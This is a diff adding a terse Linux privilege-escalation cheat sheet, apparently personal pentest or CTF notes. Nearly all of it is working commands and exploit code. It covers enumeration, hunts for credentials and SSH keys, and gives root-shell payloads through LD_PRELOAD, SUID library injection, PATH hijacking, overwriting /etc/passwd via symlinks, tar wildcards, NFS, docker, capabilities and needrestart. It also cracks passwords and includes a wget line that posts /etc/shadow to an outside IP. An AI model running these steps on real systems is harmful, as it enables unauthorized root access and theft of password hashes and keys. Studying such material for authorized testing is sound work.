@@ -1,0 +1,332 @@
+------------------
+system enumeration
+------------------
+uname -a
+uname -r 
+lsb_release -a 
+cat /proc/version
+cat /etc/issue
+
+lscpu
+
+env
+
+ps aux
+ps -axjf
+
+df -h
+
+ls -la /home/*
+ls -la /opt/*
+ls -la /var/www/*
+ls -la /var/mail/*
+ls -la /var/spool/*
+ls -la /var/backup
+ls -la /var/backups
+
+----------------
+user enumeration
+----------------
+whoami
+id
+groups
+
+sudo -l
+sudo su -
+
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+
+history
+
+-------------------
+network enumeration
+-------------------
+ip a
+ifconfig
+ip route
+
+arp -a
+ip neigh
+
+netstat -ano
+netstat -lpnt   
+netstat -lpnu
+ss -nltp
+
+---------------
+automated tools
+---------------
+linpeas.sh
+linux-exploit-suggester.sh
+
+------------------------------
+escalation via kernel exploits
+------------------------------
+detect the kernel verion then 
+
+1- searchsploit that version
+2- google if CVEs to that versoin
+
+------------------------------
+escalation via passwords files
+------------------------------
+cat $HOME/.bash_history
+
+grep --color=auto -rnw '/' -ie "PASS" --color=always 2>/dev/null
+find . -type f -exec grep -i -I "PASS" {} /dev/null \;
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc" 
+
+locate . | grep -i pass | more
+
+find / -perm a=x 2>/dev/null
+find / -user frank 2>/dev/null
+find / -type f -perm 0777 2>/dev/null
+
+find / -iname "id_rsa*" 2>/dev/null
+find / -iname "id_dsa*" 2>/dev/null
+find / -iname "id_ecdsa*" 2>/dev/null
+find / -iname "id_ed25519*" 2>/dev/null
+find / -iname "*.key" 2>/dev/null
+find / -iname "*.pem" 2>/dev/null
+find / -iname "*.ppk" 2>/dev/null
+find / -iname "authorized_keys" 2>/dev/null
+find / -iname "known_hosts" 2>/dev/null
+find / -iname "ssh_known_hosts" 2>/dev/null
+find / -iname "ssh_host_*_key*" 2>/dev/null
+find / -iname "ssh_config" 2>/dev/null
+find / -iname "sshd_config" 2>/dev/null
+find / -iname "config" 2>/dev/null | grep -i "/ssh"
+find / -type d -iname ".ssh" 2>/dev/null
+find / -path "*/.ssh/*" 2>/dev/null
+find / -iname "*ssh*" 2>/dev/null | grep -E '\.bak$|\.old$|~$|\.save$'
+find / -iname "*id_*" 2>/dev/null
+find / -iname "*key*" 2>/dev/null | grep -vE '\.(so|ko|dll)$'
+find / -iname "backup*" 2>/dev/null
+find / -iname "*.kdbx" 2>/dev/null
+find / -iname "*.bkp" 2>/dev/null
+grep -r "BEGIN RSA PRIVATE KEY" / 2>/dev/null
+grep -r "BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null
+
+------------------------------------
+escalation via weak file permissions 
+------------------------------------
+ls -la /etc/shadow
+ls -la /etc/passwd
+
+------------------- 
+escalation via sudo
+------------------- 
+sudo -l
+ -> sudo apache2 -f /etc/shadow
+ -> sudo wget --post-file=/etc/shadow 192.168.1.16:8989
+ -> sudo curl file:///etc/shadow 
+
+-
+LD_PRELOAD : 
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void __init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+
+gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles 
+sudo LD_PRELOAD=/tmp/shell.so <binary from sudo -l>
+-
+
+(ALL ,!root) NOPASSWD /bin/bash
+sudo -u#-1 /bin/bash
+
+-------------------
+escalation via SUID 
+-------------------
+find / -type f -perm -u=s 2>/dev/null
+find / -type f -perm -g=s 2>/dev/null 
+find / -user root -perm -4000 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/suid 2>/dev/null
+
+-----------------------------------
+escalation via SUID (.so injection)
+-----------------------------------
+find / -type f -perm -04000 -ls 2>/dev/null
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file|ENOENT|\.so"
+e.g - > "open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)"
+mkdir /home/user/.config
+nano /home/user/.config/libcalc.c :
+-
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject () {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+-
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c
+/usr/bin/local/suid-so
+
+----------------------------
+escalation via SUID symlinks
+----------------------------
+CVE-2016-1247 nginx 
+dpkg -l | grep nginx
+find / -type f -perm -u=s 2>/dev/null -> SUID sudo (rws-***-***)
+./nginx-root.sh /var/log/nginx/error.log 
+then we simulate to restart the nginx server as root 
+invoke-rc.d nginx rotate > /dev/null 2>&1 
+
+if a file owned by root and we have write permission but must be managed or monitored by a root process 
+echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass && rm -f /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && cp /tmp/fakepass /var/log/below/error_root.log && su pwn
+
+if this error cp: cannot create regular file '/var/log/below/error_root.log': Permission denied
+-
+while true; do
+rm -f /var/log/below/error_root.log
+ln -s /etc/passwd /var/log/below/error_root.log
+cp /tmp/fakepass /var/log/below/error_root.log && break
+done
+-
+su pwn
+
+---------------------------------       
+escalation via SUID env variables      
+---------------------------------   
+if a SUID binary execute command like service apache2 start -> strings /usr/local/bin/suid-env
+we can hijack the service command by replacing the $PATH env and create our own $PATH to make service executed as our malicious binary
+nano /tmp/service.c
+-
+#include <unistd.h>
+#include <stdlib.h>
+
+int main() { 
+setgid(0); 
+setuid(0); 
+ system("/bin/bash");
+ return 0 ;
+}     
+-
+gcc /tmp/service.c -o /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+
+if the binary (/usr/local/bin/suid-env2) execute a command but from specified path (/usr/sbin/service apache2 start) we then can export a function to that binary
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+
+--------------------------
+escalation via capabilites 
+--------------------------
+getcap -r / 2>/dev/null -> /usr/bin/python2.6 = cap_setuid+ep
+/usr/bin/python2.6 -c "import os ; os.setuid(0) ; os.system('/bin/bash')"
+
+--------------------
+cronjobs enumeration
+--------------------
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+
+if ps aux | grep -i "cron -f"
+./pspy64 -pf -i 1000 
+./pspy32 -pf -i 1000
+
+systemctl list-timers --all
+
+-------------------------
+escalation via cron paths
+-------------------------
+* * * * * root overwrite.sh
+either
+rwx-r--rw- /usr/local/bin/overwrite.sh
+echo "commad > /usr/local/bin/overwrite.sh"
+or
+echo "commad > $HOME/overwrite.sh"
+
+if 
+* * * * * root overwrite.sh
+rwx-r--rw- /usr/local/bin/overwrite.sh
+echo "commad > /usr/local/bin/overwrite.sh"
+
+----------------------------- 
+escalation via cron wildcards
+-----------------------------
+rwx-r--r-- /usr/local/bin/compress.sh
+---
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+---
+we gonna abuse * for tar command 
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+chmod +x /home/user/runme.sh
+touch "/home/user/--checkpoint=1"
+touch "/home/user/--checkpoint-action=exec=sh runme.sh"
+
+---------------------------------
+escalation via NFS root squashing
+---------------------------------
+cat /etc/exports --> "/dir" no_root_squash -> means the "/dir" can be mounted
+from kali showmount -e "victim_ip"
+we see /dir *
+mkdir -p /mnt/dir
+sudo mount -o rw,vers=2 "victim_ip":/dir /mnt/dir
+echo -e '#include <unistd.h>\n#include <stdlib.h>\nint main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }' > /mnt/dir/x.c
+gcc /mnt/dir/x.c -o /mnt/dir/x
+chmod +s /mnt/dir/x
+
+now from victim shell cd /dir && ./x 
+
+---------------------
+escalation via docker
+---------------------
+if the user is a member of a group (docker)
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
+---------------
+unshadow attack
+---------------
+unshadow passwd.txt shadow.txt > combined.txt
+john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
+
+------------------
+needrestart binary
+------------------
+cat > /tmp/exploit.conf << 'EOF'
+BEGIN { system("/bin/sh") }
+[needrestart]
+EOF
+
+sudo /usr/sbin/needrestart -c /tmp/exploit.conf
+
+ 
